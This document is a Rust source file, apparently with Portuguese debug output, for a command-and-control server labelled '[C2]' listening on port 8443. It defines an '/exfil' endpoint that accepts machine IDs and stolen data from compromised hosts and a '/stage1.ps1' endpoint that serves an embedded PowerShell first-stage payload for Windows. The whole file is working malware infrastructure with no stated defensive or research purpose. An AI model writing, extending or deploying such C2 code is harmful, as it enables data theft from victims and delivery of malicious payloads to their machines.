use warp::Filter;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use chrono::Utc;
use std::path::PathBuf;

mod config;
mod database;
mod handlers;
mod models;
mod crypto;
mod auth;

use config::Config;
use database::Database;

#[derive(Debug, Serialize, Deserialize)]
struct ExfilData {
    machine_id: String,
    data: String,
    timestamp: i64,
}

#[tokio::main]
async fn main() {
    println!("=== DEBUG ===");
    println!("1. Iniciando servidor...");
    println!("2. Diretório atual: {:?}", std::env::current_dir());
    
    println!("3. Carregando configuração...");
    let config = match Config::load() {
        Ok(c) => {
            println!("   Config carregada com sucesso");
            c
        },
        Err(e) => {
            println!("   ERRO ao carregar config: {}", e);
            return;
        }
    };
    
    println!("4. Server: {}:{}", config.server.host, config.server.port);
    println!("5. Database URL: {}", config.database.url);
    println!("6. Log file: {}", config.logging.file);
    println!("7. TLS enabled: {}", config.server.tls_enabled);
    println!("8. Cert file: {}", config.server.cert_file);
    println!("9. Key file: {}", config.server.key_file);
    
    println!("10. Inicializando banco de dados...");
    let db = match Database::new(&config.database.url).await {
        Ok(d) => {
            println!("   Banco de dados conectado com sucesso");
            d
        },
        Err(e) => {
            println!("   ERRO ao conectar banco: {}", e);
            return;
        }
    };
    
    println!("11. Servidor pronto!");
    println!("=== FIM DEBUG ===");
    
    // Endpoint pra receber dados
    let exfil = warp::path("exfil")
        .and(warp::post())
        .and(warp::body::json())
        .and_then(handle_exfil);
    
    // Endpoint pra servir payload
    let payload = warp::path("stage1.ps1")
        .and(warp::get())
        .and_then(serve_stage1);
    
    let routes = exfil.or(payload);
    
    println!("[C2] Listening on 0.0.0.0:8443");
    warp::serve(routes)
        .run(([0, 0, 0, 0], 8443))
        .await;
}

async fn handle_exfil(data: ExfilData) -> Result<impl warp::Reply, warp::Rejection> {
    println!("Recebido exfil de: {}", data.machine_id);
    Ok(warp::reply::json(&serde_json::json!({
        "status": "ok",
        "message": "Data received"
    })))
}

async fn serve_stage1() -> Result<impl warp::Reply, warp::Rejection> {
    let payload = include_str!("../payloads/windows/stage1.ps1");
    Ok(warp::reply::with_header(payload, "Content-Type", "application/octet-stream"))
}